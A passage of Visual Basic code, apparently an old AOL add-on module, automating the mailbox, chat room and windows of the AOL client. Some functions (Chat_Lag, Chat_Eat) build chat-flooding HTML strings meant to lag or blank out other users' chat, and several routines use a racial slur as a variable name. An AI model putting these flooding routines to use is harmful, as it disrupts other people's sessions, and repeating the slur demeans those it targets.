        Where = InStr(1, text$, SN$, 1)

        Put #LiFile, (X + Where) - 1, Replace$

        Mid$(text$, Where, 15) = String(15, " ")

        GoTo Find

    End If

    FreeProcess

Next X

Close #LiFile

End Sub


Sub KillListDupes(Lst As ListBox)

'Kill the duplicates in a listbox



For X = 0 To Lst.ListCount - 1

    Current = Lst.List(X)

    For i = 0 To Lst.ListCount - 1

        Nower = Lst.List(i)

        If i = X Then GoTo dontkill

        If TrimSpaces(LCase(Nower)) = TrimSpaces(LCase(Current)) Then Lst.RemoveItem (i)

dontkill:

    Next i

Next X

End Sub
Public Sub MailAddNewToListBox(ListBo As ListBox)

ListBo.MousePointer = 11

AOL% = FindWindow("AOL Frame25", vbNullString)

Mail% = FindChildByTitle(AOLMDI(), UserSN() & "'s Online Mailbox")

tabd% = FindChildByClass(Mail%, "_AOL_TabControl")

tabp% = FindChildByClass(tabd%, "_AOL_TabPage")

tree% = FindChildByClass(tabp%, "_AOL_Tree")

Z = 0

For i = 0 To SendMessageByNum(tree%, LB_GETCOUNT, 0, 0&) - 1

Buff$ = String$(100, 0)

X = SendMessageByString(tree%, LB_GETTEXT, i, Buff$)

Subj$ = Mid$(Buff$, 14, 80)

Layz = InStr(Subj$, Chr(9))

Nigga = Right(Subj$, Len(Subj$) - Layz)

ListBo.AddItem "¤ " + Str(Z) + "¤ " + Trim(Nigga)

Z = Z + 1

Next i

ListBo.MousePointer = 0

End Sub



Public Sub MailAddOldToListBox(ListBo As ListBox)

ListBo.MousePointer = 11

AOL% = FindWindow("AOL Frame25", vbNullString)

Mail% = FindChildByTitle(AOLMDI(), UserSN & "'s Online Mailbox")

tabd% = FindChildByClass(Mail%, "_AOL_TabControl")

tabp% = FindChildByClass(tabd%, "_AOL_TabPage")

tabp% = GetWindow(tabp%, 2)

tree% = FindChildByClass(tabp%, "_AOL_Tree")

Z = 0

For i = 0 To SendMessageByNum(tree%, LB_GETCOUNT, 0, 0&) - 1

Buff$ = String$(100, 0)

X = SendMessageByString(tree%, LB_GETTEXT, i, Buff$)

Subj$ = Mid$(Buff$, 14, 80)

Layz = InStr(Subj$, Chr(9))

Nigga = Right(Subj$, Len(Subj$) - Layz)

ListBo.AddItem "¤ " + Str(Z) + "¤ " + Trim(Nigga)

Z = Z + 1

Next i

ListBo.MousePointer = 0

End Sub
Public Function MailGetNewTitle(Index) As String

'returns the title of the specified index in new mail

AOL% = FindWindow("AOL Frame25", vbNullString)

MDI% = FindChildByClass(AOL%, "MDIClient")

Mail% = FindChildByTitle(MDI%, AOLUser & "'s Online Mailbox")

tabd% = FindChildByClass(Mail%, "_AOL_TabControl")

tabp% = FindChildByClass(tabd%, "_AOL_TabPage")

AOLTree% = FindChildByClass(tabp%, "_AOL_Tree")

txtlen% = SendMessageByNum(AOLTree%, LB_GETTEXTLEN, Index, 0&)

Txt$ = String(txtlen% + 1, 0&)

X = SendMessageByString(AOLTree%, LB_GETTEXT, Index, Txt$)

Subj$ = Mid$(Txt$, 14, 80)

Layz = InStr(Subj$, Chr(9))

Nigga$ = Right(Subj$, Len(Subj$) - Layz)

MailGetNewTitle = Nigga$

End Function

Public Function MailGetOldTitle(Index) As String

'returns the title of the specified index in new mail



AOL% = FindWindow("AOL Frame25", vbNullString)

MDI% = FindChildByClass(AOL%, "MDIClient")

Mail% = FindChildByTitle(MDI%, AOLUser & "'s Online Mailbox")

tabd% = FindChildByClass(Mail%, "_AOL_TabControl")

tabp% = FindChildByClass(tabd%, "_AOL_TabPage")

tabp% = GetWindow(tabp%, 2)

AOLTree% = FindChildByClass(tabp%, "_AOL_Tree")



'de = sendmessage(aoltree%, LB_GETCOUNT, 0, 0)

txtlen% = SendMessageByNum(AOLTree%, LB_GETTEXTLEN, Index, 0&)

Txt$ = String(txtlen% + 1, 0&)

X = SendMessageByString(AOLTree%, LB_GETTEXT, Index, Txt$)

Subj$ = Mid$(Txt$, 14, 80)

Layz = InStr(Subj$, Chr(9))

Nigga$ = Right(Subj$, Len(Subj$) - Layz)

MailGetOldTitle = Nigga$

End Function
Sub MailIgnoreNew(num)

AOL% = FindWindow("AOL Frame25", vbNullString)

MDI% = FindChildByClass(AOL%, "MDIClient")

Mail% = FindChildByTitle(MDI%, AOLUser & "'s Online Mailbox")

tabd% = FindChildByClass(Mail%, "_AOL_TabControl")

tabp% = FindChildByClass(tabd%, "_AOL_TabPage")

tree% = FindChildByClass(tabp%, "_AOL_Tree")

Call MailSelectNew(num)

Call SendMessage(tree%, WM_COMMAND, 515, 0)

End Sub

Sub MailIgnoreOld(num)

AOL% = FindWindow("AOL Frame25", vbNullString)

MDI% = FindChildByClass(AOL%, "MDIClient")

Mail% = FindChildByTitle(MDI%, AOLUser & "'s Online Mailbox")

tabd% = FindChildByClass(Mail%, "_AOL_TabControl")

tabp% = FindChildByClass(tabd%, "_AOL_TabPage")

tabp% = GetWindow(tabp%, 2)

tree% = FindChildByClass(tabp%, "_AOL_Tree")

Call MailSelectOld(num)

Call SendMessage(tree%, WM_COMMAND, 515, 0)

End Sub

Sub MailSelectOld(Number)

'selects a specified mail in you old mail



AOL% = FindWindow("AOL Frame25", vbNullString)

MDI% = FindChildByClass(AOL%, "MDIClient")

Mail% = FindChildByTitle(MDI%, AOLUser & "'s Online Mailbox")

tabd% = FindChildByClass(Mail%, "_AOL_TabControl")

tabp% = FindChildByClass(tabd%, "_AOL_TabPage")

tabp% = GetWindow(tabp%, 2)

AOLTree% = FindChildByClass(tabp%, "_AOL_Tree")

If AOLTree% = 0 Then Exit Sub

de = SendMessage(AOLTree%, LB_SETCURSEL, Number, 0)

End Sub

Sub MailSelectNew(Number)

'select a specified mail in your new mail

AOL% = FindWindow("AOL Frame25", vbNullString)

MDI% = FindChildByClass(AOL%, "MDIClient")

Mail% = FindChildByTitle(MDI%, AOLUser & "'s Online Mailbox")

tabd% = FindChildByClass(Mail%, "_AOL_TabControl")

tabp% = FindChildByClass(tabd%, "_AOL_TabPage")

AOLTree% = FindChildByClass(tabp%, "_AOL_Tree")

'If aoltree% = 0 Then Exit Sub

de = SendMessage(AOLTree%, LB_SETCURSEL, Number, 0)

End Sub
Sub MailWaitNew()

Mail% = FindChildByTitle(AOLMDI(), AOLUser & "'s Online Mailbox")

tabd% = FindChildByClass(Mail%, "_AOL_TabControl")

tabp% = FindChildByClass(tabd%, "_AOL_TabPage")

tree% = FindChildByClass(tabp%, "_AOL_Tree")

Do

Pause 0.1

Mail% = FindChildByTitle(AOLMDI(), UserSN + "'s Online Mailbox")

Loop Until Mail% <> 0

WinMin Mail%

lis% = tree%

Do

FreeProcess

M1% = SendMessage(lis%, LB_GETCOUNT, 0, 0&)

Pause 2

M2% = SendMessage(lis%, LB_GETCOUNT, 0, 0&)

Pause 2

M3% = SendMessage(lis%, LB_GETCOUNT, 0, 0&)

Pause 2

Loop Until M1% = M2% And M2% = M3%

M1% = SendMessage(lis%, LB_GETCOUNT, 0, 0&)

End Sub
Sub MailWaitOld()

Mail% = FindChildByTitle(AOLMDI(), UserSN() & "'s Online Mailbox")

tabd% = FindChildByClass(Mail%, "_AOL_TabControl")

tabp% = FindChildByClass(tabd%, "_AOL_TabPage")

tabp% = GetWindow(tabp%, 2)

tree% = FindChildByClass(tabp%, "_AOL_Tree")

Do

Mail% = FindChildByTitle(AOLMDI(), AOLUser + "'s Online Mailbox")

Loop Until Mail% <> 0

lis% = tree%

WinMin Mail%

Do

FreeProcess

M1% = SendMessage(lis%, LB_GETCOUNT, 0, 0&)

Pause 2

M2% = SendMessage(lis%, LB_GETCOUNT, 0, 0&)

Pause 2

M3% = SendMessage(lis%, LB_GETCOUNT, 0, 0&)

Pause 2

Loop Until M1% = M2% And M2% = M3%

M1% = SendMessage(lis%, LB_GETCOUNT, 0, 0&)

End Sub
Sub PlayWavWait(file)

'This will play a WAV file

'*Waits for the wav to end*

SoundName$ = file



X = sndPlaySound(SoundName$, 0)

End Sub
Sub SignOnAsGuest()

modaa% = FindWindow("#32769", vbNullString)

Wel% = FindChildByTitle(AOLMDI, "Goodbye From America Online")

wel2% = FindChildByTitle(AOLMDI, "Sign On")

If Wel% <> 0 Then scr% = Wel%

If wel2% <> 0 Then scr% = wel2%

Com% = FindChildByClass(scr%, "_AOL_Combobox")

click Com%

AppActivate GetText(AOLWindow)

SendKeys "{PGDN}"

End Sub
Function Countroom()
'returns the number of people in the chatroom
thechild% = FindChatRoom()
lister% = FindChildByClass(thechild%, "_AOL_Listbox")

getcount = SendMessage(lister%, LB_GETCOUNT, 0, 0)
Countroom = getcount
End Function
Function GetAOLVer()
'returns What version the User is using
AOL% = FindWindow("AOL Frame25", vbNullString)
hMenu% = GetMenu(AOL%)

SubMenu% = GetSubMenu(hMenu%, 0)
SubItem% = GetMenuItemID(SubMenu%, 8)
MenuString$ = String$(100, " ")

FindString% = GetMenuString(SubMenu%, SubItem%, MenuString$, 100, 1)

If UCase(MenuString$) Like UCase("P&ersonal Filing Cabinet") & "*" Then
GetAOLVer = 4
Else
GetAOLVer = 3
End If
End Function
Sub MembersProfile(name As String)
'This gets the profile of member "name"
Dim putname As Long, OKButton As Long
RunMenuByString ("Get a Member's Profile")
TimeOut 0.3
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
prof% = FindChildByTitle(MDI%, "Get a Member's Profile")
putname& = FindChildByClass(prof%, "_AOL_Edit")
Call SetText(putname&, name)
OKButton& = FindChildByClass(prof%, "_AOL_Button")
Button OKButton&
End Sub
Function Wait4Mail()
'this waits until the user's mail window has stopped
'listing mail
mailwin% = GetTopWindow(AOLMDI())
AOLTree% = FindChildByClass(mailwin%, "_AOL_Tree")

Do: DoEvents
firstcount = SendMessage(AOLTree%, LB_GETCOUNT, 0, 0)
TimeOut (7)
secondcount = SendMessage(AOLTree%, LB_GETCOUNT, 0, 0)
If firstcount = secondcount Then Exit Do
Loop


End Function


Function Chat_InvisibleSound(SoundName)
Chat_InvisibleSound = "<font color=""#fefefe"">{S " & SoundName

End Function
Function Chat_Lag()
'Lags Room

For X = 1 To 137
    lag = lag & "sup?<HTML></HTML>"
Next X

Chat_Lag = " <font color=""#fefefe""><pre" & lag
End Function
Function Chat_Eat(Chat)
'"Eats" the chat text
SendChat (Chat + "<font color=#fefefe><pre" & String(1500, ""))

End Function
Function List_AddToString(TheList As ListBox)
'Makes a list into a string a "comma" after each word

For DoList = 0 To TheList.ListCount - 1
    List_AddToString = List_AddToString & TheList.List(DoList) & "</Html>"
Next DoList

List_AddToString = Mid(List_AddToString, 1, Len(List_AddToString) - 2)
End Function
Function List_Click(hWnd)
'Clicks on a list

ClickList% = SendMessageByNum(hWnd, &H203, 0, 0&)
End Function
Sub List_Copy(Source, Destination)
'Copies 1 list to another

counts = SendMessage(Source, LB_GETCOUNT, 0, 0)

For Adding = 0 To counts - 1
Buffer$ = String$(250, 0)
getstrings% = SendMessageByString(Source, LB_GETTEXT, Adding, Buffer$)
addstrings% = SendMessageByString(Destination, LB_ADDSTRING, 0, Buffer$)
Next Adding
End Sub
Sub List_DelItem(Lst As ListBox, Item$)
'Deletes a item in a listbox

Do
    NoFreeze% = DoEvents()

If LCase$(Lst.List(A)) = LCase$(Item$) Then Lst.RemoveItem (A)
    A = 1 + A
Loop Until A >= Lst.ListCount
End Sub
Public Function List_Search(oListBox As ListBox, sText As String) As Integer
'Searches olistbox's contents for stext
'If it finds it, it returns it's index

Dim iIndex As Integer

With oListBox
 For iIndex = 0 To .ListCount - 1
   If .List(iIndex) = sText Then
    List_Search = iIndex
    Exit Function
   End If
 Next iIndex
End With

List_Search = -2   '  if Item isnt found
'( I didnt want to use -1 as it evaluates to True)

End Function
Sub List_SelectIndex(List%, Index%)
SendMessage List%, LB_SETCURSEL, Index%, 0
End Sub
Sub MailAddSentToListBox(ListBo As ListBox)
'adds the listings for all your sent mail to a listbox

AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
Mail% = FindChildByTitle(MDI%, AOLGetUser & "'s Online Mailbox")
tabd% = FindChildByClass(Mail%, "_AOL_TabControl")
tabp% = FindChildByClass(tabd%, "_AOL_TabPage")
tabp% = GetWindow(tabp%, 2)
tabp% = GetWindow(tabp%, 2)
AOLTree% = FindChildByClass(tabp%, "_AOL_Tree")
de = SendMessage(AOLTree%, LB_GETCOUNT, 0, 0)
i = 0
For Z = 0 To de
txtlen% = SendMessageByNum(AOLTree%, LB_GETTEXTLEN, Z, 0&)
Txt$ = String$(txtlen% + 1, 0&)
X = SendMessageByString(AOLTree%, LB_GETTEXT, Z, Txt$)
If Txt$ = "" Then GoTo Nh
Txt$ = Txt$ + String$(50, 160)
GetSentMail1 = Mid$(Txt$, InStr(Txt$, Chr$(9)) + 1, 50)
GetSentMail = Mid$(GetSentMail1, InStr(GetSentMail1, Chr$(9)) + 1, 50)
ListBo.AddItem "¤ " + Str(i) + "¤ " + (GetSentMail)
i = i + 1
Nh:
Next Z
End Sub
Public Sub Mail_BoxButtons(text)
'operate mailbox buttons

AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
Mail% = FindChildByTitle(MDI%, AOL_UserSN & "'s Online Mailbox")
If Mail% = 0 Then Exit Sub
'
text = UCase(text)
ico% = FindChildByClass(Mail%, "_AOL_Icon")
Select Case text

Case "READ"
    Call click(ico%)
Case "STATUS"
    ico% = GetWindow(ico%, 2)
    Call click(ico%)
Case "KEEP"
    ico% = GetWindow(ico%, 2)
    ico% = GetWindow(ico%, 2)
    Call click(ico%)
Case "SEARCH"
    For X = 0 To 4
    ico% = GetWindow(ico%, 2)
    Next X
    Call click(ico%)
Case "DELETE"
    For X = 0 To 5
    ico% = GetWindow(ico%, 2)
    Next X
    Call click(ico%)
Case "HELP"
    For X = 0 To 6
    ico% = GetWindow(ico%, 2)
    Next X
    Call click(ico%)

Case Else
    For X = 0 To Val(text)
    ico% = GetWindow(ico%, 2)
    Next X
    Call click(ico%)
End Select

End Sub

Public Sub Mail_Buttons(text, hWnd)
'operate the buttons of an open email

Mail% = hWnd
If Mail% = 0 Then Exit Sub
'
text = UCase(text)
ico% = FindChildByClass(Mail%, "_AOL_Icon")
Select Case text

Case "DELETE"
    For X = 0 To 1
    ico% = GetWindow(ico%, 2)
    Next X
    Call click(ico%)
Case "NEXT"
    For X = 0 To 4
    ico% = GetWindow(ico%, 2)
    Next X
    Call click(ico%)
Case "REPLY"
    For X = 0 To 5
    ico% = GetWindow(ico%, 2)
    Next X
    Call click(ico%)
Case "FORWARD"
    For X = 0 To 7
    ico% = GetWindow(ico%, 2)
    Next X
    Call click(ico%)

Case "REPLY ALL"
    For X = 0 To 9
    ico% = GetWindow(ico%, 2)
    Next X
    Call click(ico%)

Case Else
    For X = 0 To Val(text)
    ico% = GetWindow(ico%, 2)
    Next X
    Call click(ico%)
End Select

End Sub

Function Mail_WaitNew()
'Wait for your new mail to open

AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
Mail% = FindChildByTitle(MDI%, AOL_UserSN & "'s Online Mailbox")
tabd% = FindChildByClass(Mail%, "_AOL_TabControl")
tabp% = FindChildByClass(tabd%, "_AOL_TabPage")
AOLTree% = FindChildByClass(tabp%, "_AOL_Tree")
Do: DoEvents
firstcount = SendMessage(AOLTree%, LB_GETCOUNT, 0, 0)
Pause (3)
secondcount = SendMessage(AOLTree%, LB_GETCOUNT, 0, 0)
If firstcount = secondcount Then Exit Do
Loop
End Function
Sub Mail_WaitOld()
'Wait for your old mail to open

AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
Mail% = FindChildByTitle(MDI%, AOL_UserSN & "'s Online Mailbox")
tabd% = FindChildByClass(Mail%, "_AOL_TabControl")
tabp% = FindChildByClass(tabd%, "_AOL_TabPage")
tabp% = GetWindow(tabp%, 2)
AOLTree% = FindChildByClass(tabp%, "_AOL_Tree")

Do: DoEvents
    firstcount = SendMessage(AOLTree%, LB_GETCOUNT, 0, 0)
    Pause (3)
    secondcount = SendMessage(AOLTree%, LB_GETCOUNT, 0, 0)
    If firstcount = secondcount Then Exit Do
Loop
End Sub
Sub Mail_WaitSent()
'Wait for your sent mail to open
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
Mail% = FindChildByTitle(MDI%, AOL_UserSN & "'s Online Mailbox")
tabd% = FindChildByClass(Mail%, "_AOL_TabControl")
tabp% = FindChildByClass(tabd%, "_AOL_TabPage")
tabp% = GetWindow(tabp%, 2)
tabp% = GetWindow(tabp%, 2)
AOLTree% = FindChildByClass(tabp%, "_AOL_Tree")

Do: DoEvents
firstcount = SendMessage(AOLTree%, LB_GETCOUNT, 0, 0)
Pause (3)
secondcount = SendMessage(AOLTree%, LB_GETCOUNT, 0, 0)
If firstcount = secondcount Then Exit Do
Loop
End Sub
Function Mail_OpenNew()
    AOL% = FindWindow("AOL Frame25", vbNullString)
    MDI% = FindChildByClass(AOL%, "MDICLIENT")
    AOL% = FindWindow("aol frame25", vbNullString)
    X = ShowWindow(AOL%, SW_MINIMIZE)
    X = ShowWindow(AOL%, SW_RESTORE)
    TimeOut 0.1
    SendKeys "%m"
    TimeOut 0.1
    SendKeys "r"
    Pause (0.3)
End Function
Function Mail_OpenOld()
'opens your mailbox and moves over to old mail
AOL% = FindWindow("AOL Frame25", vbNullString)
TB1% = FindChildByClass(AOL%, "AOL Toolbar")
tc% = FindChildByClass(TB1%, "_AOL_Toolbar")
td% = FindChildByClass(tc%, "_AOL_Icon")
ClickIcon td%

Call Mail_WaitNew

AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
Mail% = FindChildByTitle(MDI%, UserSN & "'s Online Mailbox")
tabp% = FindChildByClass(Mail%, "_AOL_TabControl")

Call SendCharNum(tabp%, vbKeyRight)
Mail_WaitOld

End Function
Sub Mail_OpenSent()
'opens your mailbox and moves it over to sent
AOL% = FindWindow("AOL Frame25", vbNullString)
TB1% = FindChildByClass(AOL%, "AOL Toolbar")
tc% = FindChildByClass(TB1%, "_AOL_Toolbar")
td% = FindChildByClass(tc%, "_AOL_Icon")
ClickIcon td%

Call Mail_WaitNew

AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
Mail% = FindChildByTitle(MDI%, AOLGetUser & "'s Online Mailbox")
tabp% = FindChildByClass(Mail%, "_AOL_TabControl")

Call SendCharNum(tabp%, vbKeyRight)
Mail_WaitOld
Call SendCharNum(tabp%, vbKeyRight)
Mail_WaitSent
End Sub
Function Mail_SelectNew(Number)
'select a specified mail in your new mail

AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
Mail% = FindChildByTitle(MDI%, UserSN & "'s Online Mailbox")
tabd% = FindChildByClass(Mail%, "_AOL_TabControl")
tabp% = FindChildByClass(tabd%, "_AOL_TabPage")
AOLTree% = FindChildByClass(tabp%, "_AOL_Tree")
If AOLTree% = 0 Then Exit Function
de = SendMessage(AOLTree%, LB_SETCURSEL, Number, 0)
End Function
Sub Mail_SelectOld(Number)
'selects a specified mail in you old mail

AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
Mail% = FindChildByTitle(MDI%, UserSN & "'s Online Mailbox")
tabd% = FindChildByClass(Mail%, "_AOL_TabControl")
tabp% = FindChildByClass(tabd%, "_AOL_TabPage")
tabp% = GetWindow(tabp%, 2)
AOLTree% = FindChildByClass(tabp%, "_AOL_Tree")
If AOLTree% = 0 Then Exit Sub
de = SendMessage(AOLTree%, LB_SETCURSEL, Number, 0)
End Sub
Sub Mail_SelectSent(Number)
'selects a specified mail in your sent mail

AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
Mail% = FindChildByTitle(MDI%, AOL_UserSN & "'s Online Mailbox")
tabd% = FindChildByClass(Mail%, "_AOL_TabControl")
tabp% = FindChildByClass(tabd%, "_AOL_TabPage")
tabp% = GetWindow(tabp%, 2)
tabp% = GetWindow(tabp%, 2)
AOLTree% = FindChildByClass(tabp%, "_AOL_Tree")
If AOLTree% = 0 Then Exit Sub
de = SendMessage(AOLTree%, LB_SETCURSEL, Number, 0)
End Sub
Public Sub Mail_Unsend(Index)
'Unsends mail
Dim icon As Long
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
Mail% = FindChildByTitle(MDI%, UserSN & "'s Online Mailbox")
tabd% = FindChildByClass(Mail%, "_AOL_TabControl")
tabp% = FindChildByClass(tabd%, "_AOL_TabPage")
tabp% = GetWindow(tabp%, 2)
tabp% = GetWindow(tabp%, 2)
AOLTree% = FindChildByClass(tabp%, "_AOL_Tree")

Call SendMessage(AOLTree%, LB_SETCURSEL, Index, 0&)

icon& = FindChildByClass(Mail%, "_AOL_Icon")
icon& = GetWindow(icon&, 2)
icon& = GetWindow(icon&, 2)
icon& = GetWindow(icon&, 2)
icon& = GetWindow(icon&, 2)
icon& = GetWindow(icon&, 2)
icon& = GetWindow(icon&, 2)
Call Button(icon&)


End Sub
Sub KillDupes(Lst As ListBox)
For X = 0 To Lst.ListCount - 1
Current = Lst.List(X)
For i = 0 To Lst.ListCount - 1
Nower = Lst.List(i)
If i = X Then GoTo dontkill
If Nower = Current Then Lst.RemoveItem (i)
mmer.Label2.Caption = mmer.Label2.Caption - 1
dontkill:
Next i
Next X
End Sub
Sub WinHide(hWnd%)

Call ShowWindow(hWnd%, SW_HIDE)

End Sub

Sub WinShow(hWnd%)

Call ShowWindow(hWnd%, SW_SHOW)

End Sub
Sub WinRestore(hWnd%)

Call ShowWindow(hWnd%, SW_RESTORE)

End Sub

Sub WinMax(hWnd%)

Call ShowWindow(hWnd%, SW_MAXIMIZE)

End Sub

Sub WinKill(hWnd%)

Call SendMessage(hWnd%, WM_CLOSE, 0, 0)

End Sub
Sub WinMin(hWnd%)

Call ShowWindow(hWnd%, SW_MINIMIZE)

End Sub
Sub click(icon%)

SendMessage icon%, WM_LBUTTONDOWN, 0, 0&

Pause 0.0000001

SendMessage icon%, WM_LBUTTONUP, 0, 0&

End Sub
Sub DoubleClick(Button%)
'this double clicks a button
Dim DoubleClickNow%
DoubleClickNow% = SendMessageByNum(Button%, WM_LBUTTONDBLCLK, &HD, 0)
End Sub
Function Count_Lines_In_File(ByVal strFilePath As String) As Integer
'returns the number of lines in a file
'returns -1 of file doesn't exist
       '     'delcare variables
       Dim fileFile As Integer
       Dim intLinesReadCount As Integer
       intLinesReadCount = 0
       '     'open file
       fileFile = FreeFile

              If (IFileExists(strFilePath)) Then
                     Open strFilePath For Input As fileFile
              Else
                     '     'file doesn't exist
                     MsgBox "File: " & strFilePath & " Does not exist", MB_OK, "File Does Not Exist"
                     Count_Lines_In_File = -1
                     Exit Function
              End If

       '     'loop through file
       Dim strBuffer As String

              Do While Not EOF(fileFile)
                     '     'read line
                     Input #fileFile, strBuffer
                     '     'update count
                     intLinesReadCount = intLinesReadCount + 1
              Loop

       '     'close file
       Close fileFile
       '     'return value
       Count_Lines_In_File = intLinesReadCount
End Function

Function GetScreenSETTINGS()
'this returns what the screens resolution is set to.
cr$ = Chr$(13) + Chr$(10)
   TWidth% = Screen.Width \ Screen.TwipsPerPixelX
   THeight% = Screen.Height \ Screen.TwipsPerPixelY
   GetScreenSETTINGS = cr$ + cr$ + Str$(TWidth%) + " x" + Str$(THeight%)
End Function



Function GetChrValues(strin As String)
'Returns the chr values that make up a string
'written by KRhyME, this code was used in
'Voltron Chr finder

'text2 = GetChrValues(text1)

'chr(8) = backspace
'chr(9) = tab
'chr(10)= linefeed
'chr(13)= return

Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While numspc% <= lenth%
Let numspc% = numspc% + 1

Let nextchr$ = Mid$(inptxt$, numspc%, 1)

If nextchr$ = " " Then Let nextchr$ = "chr(32)"
If nextchr$ = "!" Then Let nextchr$ = "chr(33)"
If nextchr$ = """" Then Let nextchr$ = "chr(34)"
If nextchr$ = "#" Then Let nextchr$ = "chr(35)"
If nextchr$ = "$" Then Let nextchr$ = "chr(36)"
If nextchr$ = "%" Then Let nextchr$ = "chr(37)"
If nextchr$ = "&" Then Let nextchr$ = "chr(38)"
If nextchr$ = "'" Then Let nextchr$ = "chr(39)"
If nextchr$ = "(" Then Let nextchr$ = "chr(40)"
If nextchr$ = ")" Then Let nextchr$ = "chr(41)"
If nextchr$ = "*" Then Let nextchr$ = "chr(42)"
If nextchr$ = "+" Then Let nextchr$ = "chr(43)"
If nextchr$ = "," Then Let nextchr$ = "chr(44)"
If nextchr$ = "-" Then Let nextchr$ = "chr(45)"
If nextchr$ = "." Then Let nextchr$ = "chr(46)"
If nextchr$ = "/" Then Let nextchr$ = "chr(47)"
If nextchr$ = "0" Then Let nextchr$ = "chr(48)"
If nextchr$ = "1" Then Let nextchr$ = "chr(49)"
If nextchr$ = "2" Then Let nextchr$ = "chr(50)"
If nextchr$ = "3" Then Let nextchr$ = "chr(51)"
If nextchr$ = "4" Then Let nextchr$ = "chr(52)"
If nextchr$ = "5" Then Let nextchr$ = "chr(53)"
If nextchr$ = "6" Then Let nextchr$ = "chr(54)"
If nextchr$ = "7" Then Let nextchr$ = "chr(55)"
If nextchr$ = "8" Then Let nextchr$ = "chr(56)"
If nextchr$ = "9" Then Let nextchr$ = "chr(57)"
If nextchr$ = ":" Then Let nextchr$ = "chr(58)"
If nextchr$ = ";" Then Let nextchr$ = "chr(59)"
If nextchr$ = "<" Then Let nextchr$ = "chr(60)"
If nextchr$ = "=" Then Let nextchr$ = "chr(61)"
If nextchr$ = ">" Then Let nextchr$ = "chr(62)"
If nextchr$ = "?" Then Let nextchr$ = "chr(63)"
If nextchr$ = "@" Then Let nextchr$ = "chr(64)"
If nextchr$ = "A" Then Let nextchr$ = "chr(65)"
If nextchr$ = "B" Then Let nextchr$ = "chr(66)"
If nextchr$ = "C" Then Let nextchr$ = "chr(67)"
If nextchr$ = "D" Then Let nextchr$ = "chr(68)"
If nextchr$ = "E" Then Let nextchr$ = "chr(69)"
If nextchr$ = "F" Then Let nextchr$ = "chr(70)"
If nextchr$ = "G" Then Let nextchr$ = "chr(71)"
If nextchr$ = "H" Then Let nextchr$ = "chr(72)"
If nextchr$ = "I" Then Let nextchr$ = "chr(73)"
If nextchr$ = "J" Then Let nextchr$ = "chr(74)"
If nextchr$ = "K" Then Let nextchr$ = "chr(75)"
If nextchr$ = "L" Then Let nextchr$ = "chr(76)"
If nextchr$ = "M" Then Let nextchr$ = "chr(77)"
If nextchr$ = "N" Then Let nextchr$ = "chr(78)"
If nextchr$ = "O" Then Let nextchr$ = "chr(79)"
If nextchr$ = "P" Then Let nextchr$ = "chr(80)"
If nextchr$ = "Q" Then Let nextchr$ = "chr(81)"
If nextchr$ = "R" Then Let nextchr$ = "chr(82)"
If nextchr$ = "S" Then Let nextchr$ = "chr(83)"
If nextchr$ = "T" Then Let nextchr$ = "chr(84)"
If nextchr$ = "U" Then Let nextchr$ = "chr(85)"
If nextchr$ = "V" Then Let nextchr$ = "chr(86)"
If nextchr$ = "W" Then Let nextchr$ = "chr(87)"
If nextchr$ = "X" Then Let nextchr$ = "chr(88)"
If nextchr$ = "Y" Then Let nextchr$ = "chr(89)"
If nextchr$ = "Z" Then Let nextchr$ = "chr(90)"
If nextchr$ = "[" Then Let nextchr$ = "chr(91)"
If nextchr$ = "\" Then Let nextchr$ = "chr(92)"
If nextchr$ = "]" Then Let nextchr$ = "chr(93)"
If nextchr$ = "^" Then Let nextchr$ = "chr(94)"
If nextchr$ = "_" Then Let nextchr$ = "chr(95)"
If nextchr$ = "`" Then Let nextchr$ = "chr(96)"
If nextchr$ = "a" Then Let nextchr$ = "chr(97)"
If nextchr$ = "b" Then Let nextchr$ = "chr(98)"
If nextchr$ = "c" Then Let nextchr$ = "chr(99)"
If nextchr$ = "d" Then Let nextchr$ = "chr(100)"
If nextchr$ = "e" Then Let nextchr$ = "chr(101)"
If nextchr$ = "f" Then Let nextchr$ = "chr(102)"
If nextchr$ = "g" Then Let nextchr$ = "chr(103)"
If nextchr$ = "h" Then Let nextchr$ = "chr(104)"
If nextchr$ = "i" Then Let nextchr$ = "chr(105)"
If nextchr$ = "j" Then Let nextchr$ = "chr(106)"
If nextchr$ = "k" Then Let nextchr$ = "chr(107)"
If nextchr$ = "l" Then Let nextchr$ = "chr(108)"
If nextchr$ = "m" Then Let nextchr$ = "chr(109)"
If nextchr$ = "n" Then Let nextchr$ = "chr(110)"
If nextchr$ = "o" Then Let nextchr$ = "chr(111)"
If nextchr$ = "p" Then Let nextchr$ = "chr(112)"
If nextchr$ = "q" Then Let nextchr$ = "chr(113)"
If nextchr$ = "r" Then Let nextchr$ = "chr(114)"
If nextchr$ = "s" Then Let nextchr$ = "chr(115)"
If nextchr$ = "t" Then Let nextchr$ = "chr(116)"
If nextchr$ = "u" Then Let nextchr$ = "chr(117)"
If nextchr$ = "v" Then Let nextchr$ = "chr(118)"
If nextchr$ = "w" Then Let nextchr$ = "chr(119)"
If nextchr$ = "x" Then Let nextchr$ = "chr(120)"
If nextchr$ = "y" Then Let nextchr$ = "chr(121)"
If nextchr$ = "z" Then Let nextchr$ = "chr(122)"
If nextchr$ = "{" Then Let nextchr$ = "chr(123)"
If nextchr$ = "|" Then Let nextchr$ = "chr(124)"
If nextchr$ = "}" Then Let nextchr$ = "chr(125)"
If nextchr$ = "~" Then Let nextchr$ = "chr(126)"
'chr(127) through chr(144)
'are not supported by windows
